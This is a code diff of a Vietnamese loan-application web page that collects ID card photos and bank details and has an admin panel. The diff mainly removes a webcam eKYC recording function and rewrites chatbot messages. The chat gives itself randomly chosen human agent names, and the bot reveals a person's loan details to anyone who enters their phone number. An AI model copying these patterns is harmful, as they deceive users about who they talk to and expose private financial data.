@@ -257,7 +257,7 @@
                 <button onclick="nextStep(3)" class="w-full bg-amber-400 hover:bg-amber-500 text-slate-900 py-4 rounded-2xl font-black text-sm shadow-md transition mt-2">Tiếp Tục Xác Thực</button>
             </div>
 
-            <!-- TRANG 4: eKYC (CÓ CHỌN ẢNH HOẶC CHỤP + QUAY VIDEO TỰ ĐỘNG XOAY TRÁI PHẢI) -->
+            <!-- TRANG 4: eKYC -->
             <div id="step4" class="space-y-4 hidden">
                 <div class="bg-amber-50 border border-amber-200 rounded-2xl p-3.5 text-xs md:text-sm text-amber-900 space-y-1">
                     <p class="font-black">📌 Xác thực eKYC ngân hàng:</p>
@@ -265,7 +265,7 @@
                     <p class="text-xs text-amber-800">2. Video: Hệ thống tự động quay và lưu sau 3 giây.</p>
                 </div>
 
-                <!-- CCCD Mặt Trước (Chọn ảnh hoặc Chụp) -->
+                <!-- CCCD Mặt Trước -->
                 <div class="space-y-1">
                     <label class="block text-xs font-bold text-slate-700">Mặt Trước CCCD</label>
                     <div class="grid grid-cols-2 gap-2">
@@ -281,7 +281,7 @@
                     <div id="previewFront" class="text-center text-xs text-slate-400 pt-1">Chưa chọn ảnh mặt trước</div>
                 </div>
 
-                <!-- CCCD Mặt Sau (Chọn ảnh hoặc Chụp) -->
+                <!-- CCCD Mặt Sau -->
                 <div class="space-y-1">
                     <label class="block text-xs font-bold text-slate-700">Mặt Sau CCCD</label>
                     <div class="grid grid-cols-2 gap-2">
@@ -333,14 +333,15 @@
                     </div>
                 </div>
 
-                <!-- PHẦN CHỌN NHANH KHÁCH HÀNG ĐỂ LẤY MÃ PHIÊN CHAT -->
+                <!-- BẢNG CHỌN NHANH KHÁCH HÀNG -->
                 <div class="bg-blue-50 border border-blue-200 rounded-2xl p-3.5 space-y-2 text-xs">
-                    <span class="font-black text-blue-900 block">💡 Chọn nhanh khách hàng để lấy cú pháp chat Telegram:</span>
+                    <span class="font-black text-blue-900 block">💡 Bấm chọn nhanh khách hàng để sao chép cú pháp:</span>
                     <select id="quickClientSelect" onchange="selectQuickClient(this.value)" class="w-full p-2.5 bg-white border border-blue-200 rounded-xl font-bold text-blue-800 outline-none">
                         <option value="">-- Bấm chọn khách hàng cần nhắn --</option>
                     </select>
-                    <div id="quickClientSyntax" class="bg-white p-2 rounded-xl font-mono text-[11px] text-slate-700 border border-blue-100 hidden">
-                        Cú pháp copy: <span id="syntaxText" class="font-bold text-blue-600"></span>
+                    <div id="quickClientSyntax" class="bg-white p-2 rounded-xl font-mono text-[11px] text-slate-700 border border-blue-100 hidden flex justify-between items-center">
+                        <span>Cú pháp: <b id="syntaxText" class="text-blue-600"></b></span>
+                        <button onclick="copySyntax()" class="bg-blue-600 text-white px-2.5 py-1 rounded-lg font-bold text-[10px]">📋 Sao Chép</button>
                     </div>
                 </div>
 
@@ -487,7 +488,7 @@
         let currentUserName = localStorage.getItem('ff_current_name') || null;
         let isAdminLoggedIn = localStorage.getItem('ff_is_admin') === 'true';
 
-        // Hệ thống CSKH ngẫu nhiên chống trùng lặp theo từng phiên
+        // CSKH ngẫu nhiên theo phiên
         const agentNames = ["Hạ Nhiên", "Bảo Trân", "Minh Thư", "Khánh Linh", "Thuỳ Dương", "Phương Anh"];
         let assignedAgent = localStorage.getItem('ff_assigned_agent_' + currentUser);
         if (!assignedAgent) {
@@ -557,6 +558,7 @@
             if(e.key === 'Enter') sendChatMessage();
         }
 
+        // --- KIỂM TRA SỐ ĐIỆN THOẠI CHUẨN XÁC, BÁO SAI NẾU KHÔNG TỒN TẠI ---
         async function sendChatMessage() {
             const input = document.getElementById('chatInput');
             const text = input.value.trim();
@@ -569,9 +571,9 @@
                 const found = allLoans.find(l => l.user === text || (l.rPhone && l.rPhone.includes(text)));
                 setTimeout(() => {
                     if(found) {
-                        addBotMessage(`Dạ em đã tìm thấy hồ sơ của SĐT ${text}:\n- Khoản vay: ${found.amount} (${found.term})\n- Trạng thái: ${found.status}\n- Ngân hàng: ${found.bankName} (${found.bankAccount})`);
+                        addBotMessage(`Dạ em đã tìm thấy hồ sơ của SĐT ${text}:\n- Khoản vay: ${found.amount} (${found.term})\n- Đóng hàng tháng: ${found.monthlyPayment}\n- Trạng thái: ${found.status}\n\nAnh/chị có cần em hỗ trợ gì thêm về khoản vay không ạ?`, "Bot Trợ Lý");
                     } else {
-                        addBotMessage(`Dạ hệ thống không tìm thấy hồ sơ nào khớp với số điện thoại ${text}. Anh/chị có muốn tạo khoản vay mới không ạ?`);
+                        addBotMessage(`❌ Số điện thoại ${text} chưa đăng ký hồ sơ hoặc không chính xác. Vui lòng kiểm tra lại số điện thoại hoặc tạo đơn vay mới!`, "Bot Trợ Lý");
                     }
                 }, 800);
                 return;
@@ -586,7 +588,7 @@
             setTimeout(async () => {
                 const replyText = isAgentJoined ? 
                     `Dạ, chuyên viên ${assignedAgent} đã tiếp nhận yêu cầu. Anh/chị vui lòng đợi trong giây lát ạ!` :
-                    `Dạ em đã ghi nhận thông tin. Anh/chị có cần hỗ trợ gì thêm về khoản vay không ạ?`;
+                    `Dạ em đã ghi nhận thông tin. Anh/chị có cần em hỗ trợ gì thêm về khoản vay không ạ?`;
                 
                 addBotMessage(replyText, isAgentJoined ? "CSKH " + assignedAgent : "Bot Trợ Lý");
 
@@ -755,52 +757,13 @@
             container.innerHTML = html;
         }
 
-        // --- XỬ LÝ eKYC CHUYÊN NGHIỆP (CHỌN ẢNH HOẶC CHỤP + QUAY VIDEO TỰ ĐỘNG) ---
-        function handleFileSelect(input, previewId) {
+        function previewImage(input, previewId) {
             if (input.files && input.files[0]) {
                 const reader = new FileReader();
                 reader.onload = function(e) {
                     document.getElementById(previewId).innerHTML = `<img src="${e.target.result}" class="w-full h-16 object-cover rounded-xl shadow">`;
                 }
                 reader.readAsDataURL(input.files[0]);
-            }
-        }
-
-        async function startAutoEkyc() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                const videoEl = document.getElementById('webcam');
-                videoEl.srcObject = stream;
-                
-                const btn = document.getElementById('ekycBtn');
-                btn.disabled = true;
-                
-                let chunks = [];
-                let recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                
-                recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
-                recorder.onstop = () => {
-                    videoBlob = new Blob(chunks, { type: 'video/webm' });
-                    stream.getTracks().forEach(track => track.stop());
-                    document.getElementById('camStatus').textContent = "✅ Đã quay và lưu video eKYC thành công!";
-                    btn.classList.add('hidden');
-                };
-
-                recorder.start();
-                
-                // Hướng dẫn động tác tự động
-                const statusEl = document.getElementById('camStatus');
-                statusEl.textContent = "🔴 Đang quay: Nhìn thẳng vào camera...";
-                
-                setTimeout(() => { statusEl.textContent = "⬅️ Vui lòng quay đầu sang TRÁI..."; }, 1000);
-                setTimeout(() => { statusEl.textContent = "➡️ Vui lòng quay đầu sang PHẢI..."; }, 2200);
-                setTimeout(() => { 
-                    statusEl.textContent = "⏳ Đang hoàn tất xác thực..."; 
-                    recorder.stop();
-                }, 3500);
-
-            } catch(e) {
-                alert("Không thể truy cập camera. Vui lòng cấp quyền trình duyệt!");
             }
         }
 
@@ -902,7 +865,7 @@
             }
 
             let html = '';
-            let selectHtml = `<option value="">-- Bấm chọn khách hàng cần lấy mã phiên --</option>`;
+            let selectHtml = `<option value="">-- Bấm chọn khách hàng cần copy cú pháp --</option>`;
             
             allLoans.forEach((loan, idx) => {
                 html += `<div onclick="selectAdminLoan(${idx})" class="p-3.5 bg-white border border-slate-200 rounded-xl cursor-pointer hover:border-amber-400 transition space-y-1.5 text-xs shadow-sm">
